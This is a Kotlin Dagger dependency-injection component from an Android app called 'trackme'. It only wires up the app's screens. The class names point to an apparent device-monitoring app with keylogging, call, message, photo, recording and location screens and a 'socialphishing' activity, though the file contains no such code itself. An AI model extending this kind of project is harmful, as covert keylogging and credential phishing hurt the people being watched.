package com.github.tusarr10.trackme.di.component

import com.github.tusarr10.trackme.di.PerActivity
import com.github.tusarr10.trackme.di.module.ActivityModule
import com.github.tusarr10.trackme.ui.activities.mainparent.MainParentActivity
import com.github.tusarr10.trackme.ui.activities.register.RegisterActivity
import com.github.tusarr10.trackme.ui.activities.login.LoginActivity
import com.github.tusarr10.trackme.ui.activities.mainchild.MainChildActivity
import com.github.tusarr10.trackme.ui.activities.socialphishing.SocialActivityM
import com.github.tusarr10.trackme.ui.fragments.calls.CallsFragment
import com.github.tusarr10.trackme.ui.fragments.photo.PhotoFragment
import com.github.tusarr10.trackme.ui.fragments.keylog.KeysFragment
import com.github.tusarr10.trackme.ui.fragments.maps.MapsFragment
import com.github.tusarr10.trackme.ui.fragments.message.MessageFragment
import com.github.tusarr10.trackme.ui.fragments.notifications.NotifyMessageFragment
import com.github.tusarr10.trackme.ui.fragments.recording.RecordingFragment
import com.github.tusarr10.trackme.ui.fragments.social.SocialFragment
import dagger.Component

/**
 * Created by luis rafael on 8/03/18.
 */
@PerActivity
@Component(dependencies = [AppComponent::class],modules = [ActivityModule::class])
interface ActivityComponent {

    fun inject(loginActivity: LoginActivity)
    fun inject(registerActivity: RegisterActivity)
    fun inject(mainParentActivity: MainParentActivity)
    fun inject(mainChildActivity: MainChildActivity)
    fun inject(socialActivityM: SocialActivityM)
    fun inject(mapsFragment: MapsFragment)
    fun inject(callsFragment: CallsFragment)
    fun inject(messageFragment: MessageFragment)
    fun inject(photoFragment: PhotoFragment)
    fun inject(keysFragment: KeysFragment)
    fun inject(socialFragment: SocialFragment)
    fun inject(recordingFragment: RecordingFragment)
    fun inject(notifyMessageFragment: NotifyMessageFragment)

}